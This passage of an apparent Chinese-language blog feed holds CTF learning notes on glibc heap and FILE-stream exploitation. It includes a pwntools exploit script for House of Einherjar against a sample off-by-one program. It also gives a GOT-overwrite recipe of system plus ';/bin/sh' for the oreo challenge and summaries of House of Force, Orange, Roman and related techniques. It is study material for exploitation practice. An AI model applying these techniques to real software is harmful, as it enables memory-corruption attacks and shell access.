class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_IO_unbuffer_all (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *<span class="title">fp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (_IO_FILE *) _IO_list_all; fp; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (! (fp-&gt;_flags &amp; _IO_UNBUFFERED)</span><br><span class="line">  <span class="comment">/* Iff stream is un-orientated, it wasn&#x27;t used. */</span></span><br><span class="line">  &amp;&amp; fp-&gt;_mode != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="type">int</span> cnt;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAXTRIES 2</span></span><br><span class="line">  <span class="keyword">for</span> (cnt = <span class="number">0</span>; cnt &lt; MAXTRIES; ++cnt)</span><br><span class="line">    <span class="keyword">if</span> (fp-&gt;_lock == <span class="literal">NULL</span> || _IO_lock_trylock (*fp-&gt;_lock) == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="comment">/* Give the other thread time to finish up its use of the</span></span><br><span class="line"><span class="comment"> stream.  */</span></span><br><span class="line">      __sched_yield ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (! dealloc_buffers &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_USER_BUF;</span><br><span class="line"></span><br><span class="line">      fp-&gt;_freeres_list = freeres_list;</span><br><span class="line">      freeres_list = fp;</span><br><span class="line">      fp-&gt;_freeres_buf = fp-&gt;_IO_buf_base;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  _IO_SETBUF (fp, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    _IO_wsetb (fp, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  <span class="keyword">if</span> (cnt &lt; MAXTRIES &amp;&amp; fp-&gt;_lock != <span class="literal">NULL</span>)</span><br><span class="line">    _IO_lock_unlock (*fp-&gt;_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Make sure that never again the wide char functions can be</span></span><br><span class="line"><span class="comment"> used.  */</span></span><br><span class="line">      fp-&gt;_mode = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么至此我们又发现一个攻击点, 可以通过劫持流的虚表中的overflow函数为system, 在fp头部写入/bin/sh, 就可以在exit()关闭流时getshell</p>]]></content>
    
    
    <summary type="html">exit函数初识</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn技巧" scheme="https://ixout.github.io/tags/pwn%E6%8A%80%E5%B7%A7/"/>
    
    <category term="exit" scheme="https://ixout.github.io/tags/exit/"/>
    
  </entry>
  
  <entry>
    <title>pwn技巧-setcontext</title>
    <link href="https://ixout.github.io/posts/36187/"/>
    <id>https://ixout.github.io/posts/36187/</id>
    <published>2023-04-05T02:59:21.000Z</published>
    <updated>2023-04-05T08:49:47.527Z</updated>
    
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="pwn技巧" scheme="https://ixout.github.io/tags/pwn%E6%8A%80%E5%B7%A7/"/>
    
    <category term="setcontext" scheme="https://ixout.github.io/tags/setcontext/"/>
    
  </entry>
  
  <entry>
    <title>堆利用-4</title>
    <link href="https://ixout.github.io/posts/60497/"/>
    <id>https://ixout.github.io/posts/60497/</id>
    <published>2023-04-01T12:53:27.000Z</published>
    <updated>2023-04-03T15:18:38.614Z</updated>
    
    <content type="html"><![CDATA[<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><p>该堆利用技术可以强制使得 <code>malloc</code> 返回一个几乎任意地址的 chunk 。其主要在于滥用 <code>free</code> 中的后向合并操作（合并低地址的 chunk），从而使得尽可能避免碎片化。</p><p>如果可以同时控制一个 chunk prev_size 与 PREV_INUSE 字段，那么我们就可以将新的 chunk 指向几乎任何位置。</p><h2 id="后向合并"><a href="#后向合并" class="headerlink" title="后向合并"></a>后向合并</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));<span class="comment">//presize是有符号数,因此若其是负数则可以往高地址伪造chunk</span></span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="攻击过程示例"><a href="#攻击过程示例" class="headerlink" title="攻击过程示例"></a>攻击过程示例</h3><p>可以进行 House Of Einherjar 攻击的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    char* s0 = malloc(0x200);　//构造fake chunk</span><br><span class="line">    char* s1 = malloc(0x18);</span><br><span class="line">    char* s2 = malloc(0xf0);　</span><br><span class="line">    char* s3 = malloc(0x20); //为了不让s2与top chunk 合并</span><br><span class="line">    printf(&quot;begin\n&quot;);</span><br><span class="line">    printf(&quot;%p\n&quot;, s0);</span><br><span class="line">    printf(&quot;input s0\n&quot;);</span><br><span class="line">    read(0, s0, 0x200); //读入fake chunk</span><br><span class="line">    printf(&quot;input s1\n&quot;);</span><br><span class="line">    read(0, s1, 0x19); //Off By One</span><br><span class="line">    free(s2);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./example&quot;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.recvuntil(&quot;begin\n&quot;)</span><br><span class="line">address = int(p.recvline().strip(), 16)</span><br><span class="line">p.recvuntil(&quot;input s0\n&quot;)</span><br><span class="line">payload = p64(0) + p64(0x101) + p64(address) * 2 + &quot;A&quot;*0xe0    #这个101大小可能会让人困惑下面解释</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p64(address) * 2是为了绕过</span><br><span class="line">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))                      \</span><br><span class="line">  malloc_printerr (&quot;corrupted double-linked list&quot;);</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload += p64(0x100) #fake size</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;input s1\n&quot;)</span><br><span class="line">payload = &quot;A&quot;*0x10 + p64(0x220) + &quot;\x00&quot; #220使指针刚好到s0的mem指针,以使用fakechunk</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p><strong>注意这里绕过 unlink 检查的方法跟之前利用 unlink 漏洞时采用的方法不一样</strong></p><p>利用 unlink 漏洞的时候：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = &amp;p-3*4</span><br><span class="line">p-&gt;bk = &amp;p-2*4</span><br></pre></td></tr></table></figure><p>在这里利用时，因为无法得到 <code>&amp;p</code> , 所以直接让：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = p</span><br><span class="line">p-&gt;bk = p</span><br></pre></td></tr></table></figure><p><strong>这里需要注意一个点：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0) + p64(0x101) + p64(address) * 2 + &quot;A&quot;*0xe0</span><br></pre></td></tr></table></figure><p>其实修改为下面这样也是可以的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(0) + p64(0x221) + p64(address) * 2 + &quot;A&quot;*0xe0</span><br></pre></td></tr></table></figure><p>按照道理来讲 fake chunk 的 size 是 <code>0x221</code> 才合理，但是为什么 <code>0x101</code> 也可以呢？这是因为对 size 和 prev_size 的验证只发生在 unlink 里面，而 unlink 里面是这样验证的:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \</span><br><span class="line">      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br></pre></td></tr></table></figure><p>也就是说在合并完后,进行size和nextchunk_size的比较时,nextchunk是通过p指针与size来获得的,因此不是去与s2中的size比较了</p><p>所以只需要再伪造 fake chunk 的 next chunk 的 prev_size 字段就好了。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里我们总结下这个利用技术需要注意的地方</p><ul><li>需要有溢出漏洞可以写物理相邻的高地址的 prev_size 与 PREV_INUSE 部分。</li><li>我们需要计算目的 chunk 与 p1 地址之间的差，所以需要泄漏地址。</li><li>我们需要在目的 chunk 附近构造相应的 fake chunk，从而绕过 unlink 的检测。</li></ul><p>其实，该技术与 chunk extend/shrink 技术比较类似,不同的是后者只能在堆块中实现,而前者只要有偏移可以在任意地址实现</p><h1 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h1><p>利用的是top_chunk的切割机制</p><p>只要通过request2size验证可以达到在任意地址分配chunk</p><p>HOF 的利用要求还是相当苛刻的。</p><ul><li>首先，需要存在漏洞使得用户能够<strong>控制 top chunk 的 size 域。</strong></li><li>其次，<strong>需要用户能自由控制 malloc 的分配大小</strong></li><li>第三，分配的次数不能受限制</li></ul><p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过 HOF 的方法进行利用。</p><h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><p>House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。</p><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p><p>House of Lore 利用的前提是需要控制 Small Bin Chunk 的 bk 指针，并且控制指定位置 chunk 的 fd 指针。</p><h1 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h1><p>House of Orange 的利用比较特殊，首先需要目标漏洞是堆上的漏洞但是特殊之处在于题目中不存在 free 函数或其他释放堆块的函数。我们知道一般想要利用堆漏洞，需要对堆块进行 malloc 和 free 操作，但是在 House of Orange 利用中无法使用 free 函数，因此 House of Orange 核心就是通过漏洞利用获得 free 的效果。</p><p>其是为io_file服务的</p><p>如我们前面所述，House of Orange 的核心在于在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的<strong><u>原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中</u></strong>，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。</p><p>我们来看一下这个过程的详细情况，我们假设目前的 top chunk 已经不满足 malloc 的分配需求。 首先我们在程序中的<code>malloc</code>调用会执行到 libc.so 的<code>_int_malloc</code>函数中，在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，因为尺寸问题这些都不符合。接下来<code>_int_malloc</code>函数会试图使用 top chunk，在这里 top chunk 也不能满足分配的要求.</p><p>此时 ptmalloc 已经不能满足用户申请堆内存的操作，需要执行 sysmalloc 来向系统申请更多的空间。 但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展，之后原有的 top chunk 会被置于 unsorted bin 中。</p><p>综上，我们要实现 brk 拓展 top chunk，但是要实现这个目的需要绕过一些 libc 中的 check。 首先，malloc 的尺寸不能大于<code>mmp_.mmap_threshold</code></p><p>如果所需分配的 chunk 大小大于 mmap 分配阈值，默认为 128K，并且当前进程使用 mmap() 分配的内存块小于设定的最大值，将使用 mmap() 系统调用直接向操作系统申请内存。</p><p>这里检查了 top chunk 的合法性，如果第一次调用本函数，top chunk 可能没有初始化，所以可能 old_size 为 0。 如果 top chunk 已经初始化了，那么 top chunk 的大小必须大于等于 MINSIZE，因为 top chunk 中包含了 fencepost，所以 top chunk 的大小必须要大于 MINSIZE。其次 top chunk 必须标识前一个 chunk 处于 inuse 状态，并且 top chunk 的结束地址必定是页对齐的。此外 top chunk 除去 fencepost 的大小必定要小于所需 chunk 的大小，否则在_int_malloc() 函数中会使用 top chunk 分割出 chunk。</p><p>我们总结一下伪造的 top chunk size 的要求</p><ol><li>伪造的 size 必须要<strong>对齐到内存页</strong></li><li>size 要大于 MINSIZE(0x10)</li><li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li><li>size 的 prev inuse 位必须为 1</li></ol><p>之后原有的 top chunk 就会执行<code>_int_free</code>从而顺利进入 unsorted bin 中。</p><h1 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h1><p>astbin 中会把相同的 size 的被释放的堆块用一个单向链表管理，分配的时候会检查 size 是否合理，如果不合理程序就会异常退出。<strong>而 house of rabbit 就利用了在 malloc consolidate 的时候 fastbin 中的堆块进行合并时 size 没有进行检查从而伪造一个假的堆块</strong>，为进一步的利用做准备。</p><h1 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>House of Roman 这个技巧说简单点其实就是 fastbin attack 和 Unsortbin attack 结合的一个小 trick。这个漏洞与Glibc版本和源码无关，主要是利用了PIE保护的缺陷。</p><h2 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h2><p>该技术用于 bypass ALSR，利用 12-bit 的爆破来达到获取 shell 的目的。且仅仅只需要一个 UAF 漏洞以及能创建任意大小的 chunk 的情况下就能完成利用。</p><h1 id="House-of-Pig"><a href="#House-of-Pig" class="headerlink" title="House of Pig"></a>House of Pig</h1>]]></content>
    
    
    <summary type="html">how2heap！！</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="学习记录" scheme="https://ixout.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    <category term="堆" scheme="https://ixout.github.io/tags/%E5%A0%86/"/>
    
    <category term="堆利用" scheme="https://ixout.github.io/tags/%E5%A0%86%E5%88%A9%E7%94%A8/"/>
    
    <category term="how2heap" scheme="https://ixout.github.io/tags/how2heap/"/>
    
  </entry>
  
  <entry>
    <title>堆利用-3</title>
    <link href="https://ixout.github.io/posts/11792/"/>
    <id>https://ixout.github.io/posts/11792/</id>
    <published>2023-03-31T13:19:04.000Z</published>
    <updated>2023-04-02T01:47:28.027Z</updated>
    
    <content type="html"><![CDATA[<span class='p blue'>一些零碎的东西</span><h1 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h1><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><p>与UAF有点像,不过不同在于Fastbin Double Free的chunk同时处于alloced状态和在freelist中</p><h3 id="2015-9447ctf-search-engine"><a href="#2015-9447ctf-search-engine" class="headerlink" title="2015 9447ctf search_engine"></a>2015 9447ctf search_engine</h3><p>不得不说，ida给变量的类型备注还是很重要的，不然各种强制类型转换，指针式偏移能把人搞糊涂，这题就因为没注意类型，导致两个偏移被我视为指向同一个内存地址。</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><p>在可控区域伪造一个fake_chunk,并free它,使其进入fastbin中</p><h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014_hack.lu_oreo"></a>2014_hack.lu_oreo</h3><p>题目的解析,网上都很全,我只简要记一下我的理解</p><ol><li>通过ida的反汇编代码能够得到枪支的结构体,覆盖一个枪支的next指针为某个函数的got表,通过打印获得函数的地址,并以此获得system的地址</li><li>利用程序本身的计数功能,伪造一个chunk(这里有困惑一下,为什么一定要在紧跟在计数后面伪造chunk,而不是直接通过留言功能伪造chunk,因为最终我们是要利用fgets是通过一个指针向其写入数据,而我们要利用它来改写got表,而这个指针就存储在计数后面,如果在其他地方伪造chunk,我们就利用不了他了),那么要伪造chunk,首先要正确的size大小,题目申请的是0x38,那么实际大小就应该是0x40,之后还要通过nextchunk_size的检验,那么在该chunk之后的0x4处应该要伪造一个合适的大小</li><li>最后一个申请的chunk的next指针要指向我们伪造的chunk,这样我们就能释放该chunk</li><li>再重新分配chunk就能得到我们之前伪造的假chunk了,且我们将该chunk的第一个内容写为strlen的got表地址,而这里原本应该是留言指针所在,也就是说我们再次进行留言,实际上是将东西写向strlen的got表了</li><li>那么最后留言system_addr+b”;/bin/sh\x00)分号是为了执行多条命令,\x00是为了截止命令,当进入strlen函数实际上就是进入了system(/bin/sh)</li></ol><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><p>利用了UAF,再free后又去改写该chunk的fd指针,使其指向栈中一个可以被视为fastbin_chunk的内存空间(size域合适等)</p><p>指向的chunk要绕过该检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h2><p>与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 事实上只要满足目标地址存在合法的 size 域,chunk 分配到任意的可写内存中，比如 bss、heap、data、stack 等等。</p><h1 id="unsortedbin-attack"><a href="#unsortedbin-attack" class="headerlink" title="unsortedbin attack"></a>unsortedbin attack</h1><p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p><p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><strong>什么情况下会被放入unsortedbin</strong></p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。(即last remainer)</li><li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，若合并后不与top chunk相邻,则会将合并后的chunk放入unsortedbin。</li></ol><p><strong>使用情况</strong></p><ol><li>unsortedbin采用的是FIFO,<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，<strong>否则就会把这些 chunk 分别插入到对应的 bin 中</strong>。</li></ol><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>unsorted bin attack主要是用来为进一步的攻击服务的</p><p>其利用的函数片段为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>不难看出要攻击就要能修改某个chunk的bk指针,达到的效果是将&amp;bins[0]-2会被写入指定位置</p><h3 id="例HITCON-Training-lab14-magic-heap"><a href="#例HITCON-Training-lab14-magic-heap" class="headerlink" title="例HITCON Training lab14 magic heap"></a>例HITCON Training lab14 magic heap</h3><h1 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h1><p>这种攻击方式主要利用的是 chunk 进入 bin 中的操作，在 malloc 的时候，遍历 unsorted bin 时，对每一个 chunk，若无法 exact-fit 分配或不满足切割分配的条件，就会将该 chunk 置入相应的 bin 中，而此过程中缺乏对 largebin 的跳表指针的检测。</p><h2 id="基础-1"><a href="#基础-1" class="headerlink" title="基础"></a>基础</h2><p>在index相同的情况下：</p><ol><li><p>一般空闲的large chunk在fd的遍历顺序中，<strong>按照由大到小的顺序排列</strong>。这样可以避免在寻找合适chunk时挨个遍历</p></li><li><p>如果大小相同，按照free的时间排序</p></li><li>多个大小相同的堆块，只有首堆块的fd_nextsize和bk_nextsize会指向其他堆块，后面的堆块的fd_nextsize和bk_nextsize均为0</li><li>size最大的chunk的bk_nextsize指向最小的chunk，size最小的chunk的fd_nextsize指向最大的chunk</li></ol><p>空闲chunk的结构与unsorted和small的差别就在于多了fd_nextsize和bk_nextsize,分别指向下一个大小的chunk和上一个大小的chunk(很多教程更多更喜欢说前后,但我觉得<strong>上下更好理解</strong>),且chunk在largebin free list中按从大到小排序是重要细节</p><p><strong>将chunk放入largebin中的操作</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index 